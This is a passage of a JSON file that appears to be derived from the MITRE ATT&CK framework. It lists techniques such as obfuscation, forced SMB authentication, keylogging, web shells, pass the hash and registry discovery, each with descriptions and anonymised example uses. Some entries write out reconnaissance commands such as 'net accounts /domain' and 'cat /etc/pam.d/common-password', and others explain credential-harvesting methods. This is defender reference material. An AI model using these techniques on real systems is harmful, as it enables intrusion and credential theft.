      "Most strings in  are encrypted using 3DES and XOR and reversed.",
      "uses single-byte XOR obfuscation to obfuscate many of its files.",
      "uses the Invoke-Obfuscation framework to obfuscate their PowerShell and also performs other code obfuscation.",
      "The payload of  is encrypted with simple XOR with a rotating key. The  configuration file has been encrypted with RC4 keys.",
      "Most of the strings in  are encrypted with an XOR-based algorithm; some strings are also encrypted with 3DES and reversed. API function names are also reversed, presumably to avoid detection in memory.",
      "encrypts several of its files, including configuration files.",
      "obfuscates strings using a custom stream cipher.",
      "has used XOR with 0x90 to obfuscate its configuration file.",
      "uses multiple techniques to obfuscate strings, including XOR.",
      "A version of  introduced in July 2015 obfuscated the binary using opaque predicates and other techniques in a likely attempt to obfuscate it and bypass security products.",
      "is obscured using XOR encoding and appended to a valid GIF file.",
      "obfuscates some commands by using statically programmed fragments of strings when starting a DLL. It also uses a one-byte xor against 0x91 to encode configuration data.",
      "Many strings in  are obfuscated with a XOR algorithm.",
      "strings, network data, configuration, and modules are encrypted with a modified RC4 algorithm.",
      "Some data in  is encrypted using RC5 in CBC mode, AES-CBC with a hardcoded key, RC4, or Salsa20. Some data is also base64-encoded.",
      "Some resources in  are encrypted with a simple XOR operation or encoded with Base64.",
      "obfuscates internal strings and unpacks them at startup.",
      "uses steganography to hide backdoors in PNG files, which are also encrypted using the Tiny Encryption Algorithm (TEA).",
      "appends a file signature header (randomly selected from six file types) to encrypted data prior to upload or download.",
      "A  configuration file is encrypted with a simple XOR key, 0x53.",
      "uses various XOR techniques to obfuscate its components.",
      "obfuscates files by splitting strings into smaller sub-strings and including \"garbage\" strings that are never used. The malware also uses return-oriented programming (ROP) technique and single-byte XOR to obfuscate data.",
      "disguised its malicious binaries with several layers of obfuscation, including encrypting the files.",
      "has encoded payloads with a single-byte XOR, both skipping the key itself and zeroing in an attempt to avoid exposing the key.",
      "malware uses multiple types of encryption and encoding in its malware files, including AES, Caracachs, RC4, basic XOR with constant 0xA7, and other techniques.",
      "Droppers used by  use RC4 or a 16-byte XOR key consisting of the bytes 0xA0 – 0xAF to obfuscate payloads.",
      "encrypted a .dll payload using RTL and a custom encryption algorithm.  has also obfuscated payloads with base64, XOR, and RC4."
    ],
    "id": "T1027",
    "name": "Obfuscated Files or Information",
    "similar_words": [
      "Obfuscated Files or Information"
    ]
  },
  "attack-pattern--b53dbcc6-147d-48bb-9df4-bcb8bb808ff6": {
    "description": "The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common  keyboard interrupts like ctrl+c and ctrl+d. Adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism. Trap commands are of the following format trap 'command list' signals where \"command list\" will be executed when \"signals\" are received.",
    "example_uses": [],
    "id": "T1154",
    "name": "Trap",
    "similar_words": [
      "Trap"
    ]
  },
  "attack-pattern--b6075259-dba3-44e9-87c7-e954f37ec0d5": {
    "description": "Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). An adversary may attempt to access detailed information about the password policy used within an enterprise network. This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\n\nPassword policies can be set and discovered on Windows, Linux, and macOS systems. (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies)\n\n### Windows\n* net accounts\n* net accounts /domain\n\n### Linux\n* chage -l <username>\n* cat /etc/pam.d/common-password\n\n### macOS\n* pwpolicy getaccountpolicies",
    "example_uses": [
      "has used net.exe in a script with net accounts /domain to find the password policy of a domain.",
      "collects password policy information with the command net accounts.",
      "The net accounts and net accounts /domain commands with  can be used to obtain password policy information."
    ],
    "id": "T1201",
    "name": "Password Policy Discovery",
    "similar_words": [
      "Password Policy Discovery"
    ]
  },
  "attack-pattern--b77cf5f3-6060-475d-bd60-40ccbf28fdc2": {
    "description": "The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources. Web Distributed Authoring and Versioning (WebDAV) is typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)\n\nAdversaries may take advantage of this behavior to gain access to user account hashes through forced SMB authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information including the user's hashed credentials over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials, or reuse it for [Pass the Hash](https://attack.mitre.org/techniques/T1075). (Citation: Cylance Redirect to SMB)\n\nThere are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:\n\n* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to file[:]//[remote address]/Normal.dotm to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)\n* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as \\\\[remote address]\\pic.png that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)",
    "example_uses": [
      "used  to launch an authentication window for users to enter their credentials.",
      "has gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems."
    ],
    "id": "T1187",
    "name": "Forced Authentication",
    "similar_words": [
      "Forced Authentication"
    ]
  },
  "attack-pattern--b8c5c9dd-a662-479d-9428-ae745872537c": {
    "description": "Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as dynamic link libraries (DLLs) containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts.\n\nBefore registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.\n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made. (Citation: Carnal Ownage Password Filters Sept 2013)",
    "example_uses": [
      "harvests plain-text credentials as a password filter registered on domain controllers."
    ],
    "id": "T1174",
    "name": "Password Filter DLL",
    "similar_words": [
      "Password Filter DLL"
    ]
  },
  "attack-pattern--b9f5dbe2-4c55-4fc5-af2e-d42c1d182ec4": {
    "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.",
    "example_uses": [
      "has used RAR to stage and compress local folders.",
      "adds collected files to a temp.zip file saved in the %temp% folder, then base64 encodes it and uploads it to control server.",
      "uses WinRAR to compress data that is intended to be exfiltrated.",
      "hides collected data in password-protected .rar archives.",
      "uses the zip -r command to compress the data collected on the local system.",
      "contains code to compress files.",
      "zips up files before exfiltrating them.",
      "will zip up the /Library/Keychains directory before exfiltrating it.",
      "compresses collected files with both the GZipStream class and a simple character replacement scheme before sending them to its C2 server.",
      "compressed data into .zip files prior to exfiltrating it.",
      "used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.",
      "has created password-protected RAR, WinImage, and zip archives to be exfiltrated.",
      "has used RAR to compress collected data before.",
      "can compress data with Zip before sending it over C2.",
      "extracted documents and bundled them into a RAR archive.",
      "has used tools to compress data before exfilling it.",
      "uses ZPP, a .NET console program, to compress files with ZIP.",
      "has compressed data into password-protected RAR archives prior to exfiltration.",
      "compressed data with zlib prior to sending it over C2.",
      "The  backdoor compresses communications using the standard Zlib compression library.",
      "compresses output data generated by command execution with a custom implementation of the Lempel–Ziv–Welch (LZW) algorithm.",
      "Modules can be pushed to and executed by  that copy data to a staging area, compress it, and XOR encrypt it.",
      "has compressed files before exfiltration using TAR and RAR.",
      "can compress data before sending it.",
      "After collecting documents from removable media,  compresses the collected files.",
      "Following data collection,  has compressed log files into a ZIP archive prior to staging and exfiltration.",
      "malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server.  malware RomeoDelta archives specified directories in .zip format, encrypts the .zip file, and uploads it to its C2 server.",
      "has used RAR to compress, encrypt, and password-protect files prior to exfiltration.",
      "has used RAR to compress files before moving them outside of the victim network.",
      "The  group has been known to compress data before exfiltration."
    ],
    "id": "T1002",
    "name": "Data Compressed",
    "similar_words": [
      "Data Compressed"
    ]
  },
  "attack-pattern--ba8e391f-14b5-496f-81f2-2d5ecd646c1c": {
    "description": "Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through [Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)",
    "example_uses": [
      "searches for files named logins.json to parse for credentials and also looks for credentials stored from browsers.",
      "gathers credentials in files for chrome, 1password, and keychains.",
      "can obtain passwords from common browsers and FTP clients.",
      "has a tool that can locate credentials in files on the file system such as those from Firefox or Chrome.",
      "DPAPI module can harvest protected credentials stored and/or cached by browsers and other user applications by interacting with Windows cryptographic application programming interface (API) functions.",
      "has used a plug-in to gather credentials stored in files on the host by various software programs, including The Bat! email client, Mozilla password manager, Google Chrome password manager, Outlook, Internet Explorer, and Windows Credential Store.",
      "contains the getFirefoxPassword function to attempt to locate Firefox passwords.",
      "If an initial connectivity check fails,  attempts to extract proxy details and credentials from Windows Protected Storage and from the IE Credentials Store. This allows the adversary to use the proxy credentials for subsequent requests if they enable outbound HTTP access.",
      "A module in  gathers logins and passwords stored in applications on the victims, including Google Chrome, Mozilla Firefox, and several other browsers.",
      "is capable of accessing locally stored passwords on victims."
    ],
    "id": "T1081",
    "name": "Credentials in Files",
    "similar_words": [
      "Credentials in Files"
    ]
  },
  "attack-pattern--bb0e0cb5-f3e4-4118-a4cb-6bf13bfbc9f2": {
    "description": "Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. (Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at HKLM\\SOFTWARE\\Microsoft\\Netsh.\n\nAdversaries can use netsh.exe with helper DLLs to proxy execution of arbitrary code in a persistent manner when netsh.exe is executed automatically with another Persistence technique or if other persistent software is present on the system that executes netsh.exe as part of its normal functionality. Examples include some VPN software that invoke netsh.exe. (Citation: Demaske Netsh Persistence)\n\nProof of concept code exists to load Cobalt Strike's payload using netsh.exe helper DLLs. (Citation: Github Netsh Helper CS Beacon)",
    "example_uses": [
      "can be used as a persistence proxy technique to execute a helper DLL when netsh.exe is executed."
    ],
    "id": "T1128",
    "name": "Netsh Helper DLL",
    "similar_words": [
      "Netsh Helper DLL"
    ]
  },
  "attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2": {
    "description": "Adversaries can use methods of capturing user input for obtaining credentials for [Valid Accounts](https://attack.mitre.org/techniques/T1078) and information Collection that include keylogging and user input field interception.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes, (Citation: Adventures of a Keystroke) but other methods exist to target information for specific purposes, such as performing a UAC prompt or wrapping the Windows default credential provider. (Citation: Wrightson 2012)\n\nKeylogging is likely to be used to acquire credentials for new access opportunities when [Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to remain passive on a system for a period of time before an opportunity arises.\n\nAdversaries may also install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service. (Citation: Volexity Virtual Private Keylogging)",
    "example_uses": [
      "logs the keystrokes on the targeted system.",
      "has used keyloggers.",
      "has used a keylogging tool called KEYPUNCH.",
      "uses a keylogger plugin to gather keystrokes.",
      "captures keystrokes and sends them back to the C2 server.",
      "collects keystrokes from the victim machine.",
      "uses a keylogger to capture keystrokes and location of where the user is typing.",
      "has a built-in keylogger.",
      "uses a keylogger to capture keystrokes.",
      "captures keystrokes.",
      "collects keystrokes from the victim’s machine.",
      "contains keylogging capabilities",
      "has the capability to log keystrokes from the victim’s machine.",
      "is capable of logging keystrokes.",
      "has used several different keyloggers.",
      "contains a custom keylogger.",
      "is capable of logging keystrokes.",
      "Get-Keystrokes Exfiltration module can log keystrokes.",
      "can perform keylogging.",
      "uses a keylogger to capture keystrokes it then sends back to the server after it is stopped.",
      "malware is capable of keylogging.",
      "The executable version of  has a module to log keystrokes.",
      "is capable of keylogging.",
      "has used keylogging tools.",
      "can log keystrokes.",
      "can track key presses with a keylogger module.",
      "has the ability to initiate keylogging.",
      "contains keylogging functionality to steal passwords.",
      "uses a keylogger and steals clipboard contents from victims.",
      "contains a keylogger module.",
      "contains a keylogger.",
      "contains a keylogger.",
      "can perform keylogging.",
      "When it first starts,  spawns a new thread to log keystrokes.",
      "can track key presses with a keylogger module.",
      "contains a keylogger.",
      "has the capability to capture keystrokes.",
      "The  RAT has a keylogger.",
      "contains a keylogger.",
      "contains keylogger functionality.",
      "has run a keylogger plug-in on a victim.",
      "is capable of performing keylogging.",
      "creates a new thread implementing a keylogging facility using Windows Keyboard Accelerators.",
      "can record keystrokes from both the keyboard and virtual keyboard.",
      "contains a keylogger component.",
      "contains keylogging functionality that will monitor for active application windows and write them to the log, it can handle special characters, and it will buffer by default 50 characters before sending them out over the C2 infrastructure.",
      "has keylogging functionality.",
      "captures and DES-encrypts credentials before writing the username and password to a log file, C:\\log.txt.",
      "has a keylogger.",
      "is capable of capturing keystrokes on victims.",
      "is capable of recording keystrokes.",
      "logs key strokes for configured processes and sends them back to the C2 server.",
      "contains a keylogger module that collects keystrokes and the titles of foreground windows.",
      "Malware used by  is capable of capturing keystrokes.",
      "malware KiloAlfa contains keylogging functionality.",
      "actors installed a credential logger on Microsoft Exchange servers.  also leveraged the reconnaissance framework, ScanBox, to capture keystrokes.",
      "has used a keylogging tool that records keystrokes in encrypted files.",
      "uses a sophisticated keylogger.",
      "has used tools to perform keylogging."
    ],
    "id": "T1056",
    "name": "Input Capture",
    "similar_words": [
      "Input Capture"
    ]
  },
  "attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63": {
    "description": "Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1192). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193), [Spearphishing Link](https://attack.mitre.org/techniques/T1192), and [Spearphishing via Service](https://attack.mitre.org/techniques/T1194). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
    "example_uses": [
      "has exploited Adobe Flash vulnerability CVE-2018-4878 for execution.",
      "has exploited Microsoft Word vulnerability CVE-2014-4114 for execution.",
      "leverages a known zero-day vulnerability in Adobe Flash to execute the implant into the victims’ machines.",
      "leverages vulnerable versions of Flash to perform execution.",
      "had exploited multiple vulnerabilities for execution, including Microsoft’s Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, and CVE-2017-0199.",
      "uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, and CVE-2015-1641.",
      "has used multiple software exploits for common client software, like Microsoft Word and Adobe Reader, to gain code execution as part of.",
      "has used Flash Player (CVE-2016-4117, CVE-2018-4878) and Word (CVE-2017-0199) exploits for execution.",
      "has exploited Microsoft Word vulnerability CVE-2017-0199 for execution.",
      "has exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882.",
      "has used exploitation of endpoint software, including Microsoft Internet Explorer Adobe Flash vulnerabilities, to gain execution. They have also used zero-day exploits."
    ],
    "id": "T1203",
    "name": "Exploitation for Client Execution",
    "similar_words": [
      "Exploitation for Client Execution"
    ]
  },
  "attack-pattern--c0a384a4-9a25-40e1-97b6-458388474bc8": {
    "description": "On Linux and macOS systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, (Citation: Die.net Linux crontab Man Page) at, (Citation: Die.net Linux at Man Page) and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike [Scheduled Task](https://attack.mitre.org/techniques/T1053) on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).\n\n### cron\n\nSystem-wide cron jobs are installed by modifying /etc/crontab file, /etc/cron.d/ directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files. (Citation: AppleDocs Scheduling Timed Jobs) This works on macOS and Linux systems.\n\nThose methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence, (Citation: Janicab) (Citation: Methods of Mac Malware Persistence) (Citation: Malware Persistence on OS X) (Citation: Avast Linux Trojan Cron Persistence) to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.\n\n### at\n\nThe at program is another means on POSIX-based systems, including macOS and Linux, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes.\n\n### launchd\n\nEach launchd job is described by a different configuration property list (plist) file similar to [Launch Daemon](https://attack.mitre.org/techniques/T1160) or [Launch Agent](https://attack.mitre.org/techniques/T1159), except there is an additional key called StartCalendarInterval with a dictionary of time values. (Citation: AppleDocs Scheduling Timed Jobs) This only works on macOS and OS X.",
    "example_uses": [
      "used a cron job for persistence on Mac devices."
    ],
    "id": "T1168",
    "name": "Local Job Scheduling",
    "similar_words": [
      "Local Job Scheduling"
    ]
  },
  "attack-pattern--c0df6533-30ee-4a4a-9c6d-17af5abdf0b2": {
    "description": "When the setuid or setgid bits are set on Linux or macOS for an application, this means that the application will run with the privileges of the owning user or group respectively  (Citation: setuid man page). Normally an application is run in the current user’s context, regardless of which user or group owns the application. There are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges. Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via ls -l. The chmod program can set these bits with via bitmasking, chmod 4777 [file] or via shorthand naming, chmod u+s [file].\n\nAn adversary can take advantage of this to either do a shell escape or exploit a vulnerability in an application with the setsuid or setgid bits to get code running in a different user’s context. Additionally, adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future  (Citation: OSX Keydnap malware).",
    "example_uses": [
      "adds the setuid flag to a binary so it can easily elevate in the future."
    ],
    "id": "T1166",
    "name": "Setuid and Setgid",
    "similar_words": [
      "Setuid and Setgid"
    ]
  },
  "attack-pattern--c16e5409-ee53-4d79-afdc-4099dc9292df": {
    "description": "A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)\n\nWeb shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.",
    "example_uses": [
      "commonly created Web shells on victims' publicly accessible email and web servers, which they used to maintain access to a victim network and download additional malicious files.",
      "has used Web shells to maintain access to victim websites.",
      "has used Web shells, often to maintain access to a victim network.",
      "is a Web shell.",
      "The  backdoor is a Web shell that supports server payloads for many different kinds of server-side scripting languages and contains functionality to access files, connect to a database, and open a virtual command prompt.",
      "is a Web shell that appears to be exclusively used by . It is installed as an ISAPI filter on Exchange servers and shares characteristics with the  Web shell.",
      "is a Web shell. The ASPXTool version used by  has been deployed to accessible servers running Internet Information Services (IIS).",
      "uses Web shells on publicly accessible Web servers to access victim networks."
    ],
    "id": "T1100",
    "name": "Web Shell",
    "similar_words": [
      "Web Shell"
    ]
  },
  "attack-pattern--c1a452f3-6499-4c12-b7e9-a6a0a102af76": {
    "description": "Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)\n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)\n\nAdversaries may leverage TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055) called Process Doppelgänging. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1093), Process Doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process Doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext. (Citation: BlackHat Process Doppelgänging Dec 2017)\n\nProcess Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017):\n\n* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\n* Load – Create a shared section of memory and load the malicious executable.\n* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.\n* Animate – Create a process from the tainted section of memory and initiate execution.",
    "example_uses": [
      "abuses NTFS transactions to launch and conceal malicious processes."
    ],
    "id": "T1186",
    "name": "Process Doppelgänging",
    "similar_words": [
      "Process Doppelgänging"
    ]
  },
  "attack-pattern--c1b11bf7-c68e-4fbf-a95b-28efbe7953bb": {
    "description": "Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.\n\nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial. (Citation: Slideshare Abusing SSH) (Citation: SSHjack Blackhat) (Citation: Clockwork SSH Agent Hijacking) Compromising the SSH agent also provides access to intercept SSH credentials. (Citation: Welivesecurity Ebury SSH)\n\n[SSH Hijacking](https://attack.mitre.org/techniques/T1184) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it injects into an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).",
    "example_uses": [],
    "id": "T1184",
    "name": "SSH Hijacking",
    "similar_words": [
      "SSH Hijacking"
    ]
  },
  "attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b": {
    "description": "Use of a standard non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. (Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
    "example_uses": [
      "has used the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.",
      "Some  variants use raw TCP for C2.",
      "can be configured to use raw TCP or UDP for command and control.",
      "is capable of using ICMP, TCP, and UDP for C2.",
      "The  malware platform can use ICMP to communicate between infected computers.",
      "can communicate using SOCKS.",
      "uses a custom TCP protocol for C2.",
      "binds to a raw socket on a random source port between 31800 and 31900 for C2.",
      "network traffic can communicate over a raw socket.",
      "C2 traffic can communicate via TCP raw sockets.",
      "completes network communication via raw sockets.",
      "If  does not detect a proxy configured on the infected machine, it will send beacons via UDP/6000. Also, after retrieving a C2 IP address and Port Number,  will initiate a TCP connection to this socket. The ensuing connection is a plaintext C2 channel in which commands are specified by DWORDs.",
      "network traffic communicates over a raw socket.",
      "communicates via ICMP for C2.",
      "An  downloader establishes SOCKS5 connections for its initial C2."
    ],
    "id": "T1095",
    "name": "Standard Non-Application Layer Protocol",
    "similar_words": [
      "Standard Non-Application Layer Protocol"
    ]
  },
  "attack-pattern--c23b740b-a42b-47a1-aec2-9d48ddd547ff": {
    "description": "Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems. \n\nWindows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes. (Citation: NSA Spotting)",
    "example_uses": [
      "SEKURLSA::Pth module can impersonate a user, with only a password hash, to execute arbitrary commands.",
      "can perform pass the hash.",
      "can perform pass the hash.",
      "used Kerberos ticket attacks for lateral movement.",
      "has used pass the hash for lateral movement.",
      "The  group is known to have used pass the hash."
    ],
    "id": "T1075",
    "name": "Pass the Hash",
    "similar_words": [
      "Pass the Hash"
    ]
  },
  "attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896": {
    "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. (Citation: Wikipedia Windows Registry) Some of the information may help adversaries to further their operation within a network.",
    "example_uses": [
      "queried the Registry to identify victim information.",
      "checks if a value exists within a Registry key in the HKCU hive whose name is the same as the scheduled task it has created.",
      "checks the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings for proxy configurations information.",
      "queries the Registry for specific keys for potential privilege escalation and proxy information.",
      "gathers information about the Registry.",
      "searches for certain Registry keys to be configured before executing the payload.",
      "can enumerate Registry values, keys, and data.",
      "queries Registry values as part of its anti-sandbox checks.",
      "enumerates Registry keys associated with event logs.",
      "gathers product names from the Registry key: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion ProductName and the processor description from the Registry key HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 ProcessorNameString.",
      "A  tool can read and decrypt stored Registry values.",
      "checks the system for certain Registry keys.",
      "accesses the HKLM\\System\\CurrentControlSet\\Services\\mssmbios\\Data\\SMBiosData Registry key to obtain the System manufacturer value to identify the machine type.",
      "enumerates registry keys with the command regkeyenum and obtains information for the Registry key HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.",
      "uses the command reg query “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\InternetSettings”.",
      "creates a backdoor through which remote attackers can retrieve system information, such as CPU speed, from Registry keys.",
      "can enumerate Registry keys.",
      "contains a collection of Privesc-PowerUp modules that can query Registry keys for potential opportunities.",
      "is capable of enumerating Registry keys and values.",
      "may query the Registry by running reg query on a victim.",
      "queries the registry to look for information about Terminal Services.",
      "has used reg query “HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default” on a victim to query the Registry.",
      "queries the Registry to determine the correct Startup path to use for persistence.",
      "searches and reads the value of the Windows Update Registry Run key.",
      "may be used to gather details from the Windows Registry of a local or remote system at the command-line interface.",
      "can enumerate registry keys.",
      "is capable of enumerating and making modifications to an infected system's Registry.",
      "provides access to the Windows Registry, which can be used to gather information.",
      "queries Registry keys in preparation for setting Run keys to achieve persistence.",
      "queries several Registry keys to identify hard disk partitions to overwrite.",
      "can query for information contained within the Windows Registry.",
      "can gather Registry values.",
      "malware attempts to determine the installed version of .NET by querying the Registry.",
